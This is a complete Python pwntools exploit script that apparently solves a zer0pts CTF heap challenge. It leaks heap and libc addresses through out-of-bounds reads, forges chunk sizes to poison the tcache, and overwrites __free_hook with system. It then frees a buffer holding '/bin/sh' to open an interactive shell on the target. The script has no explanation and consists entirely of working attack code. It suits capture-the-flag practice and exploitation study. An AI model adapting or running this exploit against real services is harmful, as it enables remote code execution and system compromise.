from __future__ import division, print_function
import random
from pwn import *
import argparse
import time


context.log_level = 'error'

parser = argparse.ArgumentParser()
parser.add_argument(
        "--host",
        default="127.0.0.1",
        help="target host"
        )
parser.add_argument(
        "--port",
        default=3001,
        help="target port"
        )
parser.add_argument(
        '--log',
        action='store_true'
        )
parser.add_argument(
        '--is-gaibu',
        action='store_true'
        )
args = parser.parse_args()


log = args.log
is_gaibu = args.is_gaibu
if is_gaibu:
    host = "pwn.ctf.zer0pts.com"
    port = 9001
else:
    host = args.host
    port = args.port

def wait_for_attach():
    if not is_gaibu:
        print('attach?')
        raw_input()

def just_u64(x):
    return u64(x.ljust(8, '\x00'))

r = remote(host, port)

def recvuntil(x, verbose=True):
    s = r.recvuntil(x)
    if log and verbose:
        print(s)
    return s.strip(x)

def recv(n, verbose=True):
    s = r.recv(n)
    if log and verbose:
        print(s)
    return s

def recvline(verbose=True):
    s = r.recvline()
    if log and verbose:
        print(s)
    return s.strip('\n')

def sendline(s, verbose=True):
    if log and verbose:
        pass
        #print(s)
    r.sendline(s)

def send(s, verbose=True):
    if log and verbose:
        print(s, end='')
    r.send(s)

def interactive():
    r.interactive()

####################################

def menu(choice):
    recvuntil('>>')
    sendline(str(choice))

# receive and send
def rs(s, new_line=True, r=':'):
    recvuntil(r)
    s = str(s)
    if new_line:
        sendline(s)
    else:
        send(s)


def push_back(v):
    menu(1)
    rs(v)

def store(i, v):
    menu(3)
    rs(i)
    rs(v)

def storeword(i, v):
    store(i, v & 0xffffffff)
    store(i + 1, v >> 32)

def load(i):
    menu(4)
    rs(i)
    recvuntil('value: ')
    return int(recvline())
def wipe():
    menu(5)



for i in range(16):
    push_back(i)

heap_base = (load(-9) << 32) + (load(-10)) - 0x10
print(hex(heap_base))

for i in range(0x400 - 16):
    push_back(i+1)
libc_base = (load(-515) << 32) + (load(-514)) - 0x10 - 0x1ebbd0
print(hex(libc_base))


wipe()

for i in range(64):
    push_back(i)

store(-2, 0x51)

storeword(18, 0x110 - 0x50 + 1)

wait_for_attach()
for i in range(64):
    push_back(64 + i)

system = 0x55410 + libc_base
free_hook = 0x1eeb28 + libc_base - 0x8
storeword(-68, free_hook)

wipe()

for i in range(16):
    push_back(i)

store(-2, 0x111)

wipe()


for i in range(8):
    print(i)
    push_back(i)
storeword(0, 29400045130965551)
storeword(2, system)

wait_for_attach()
push_back(9)


interactive()

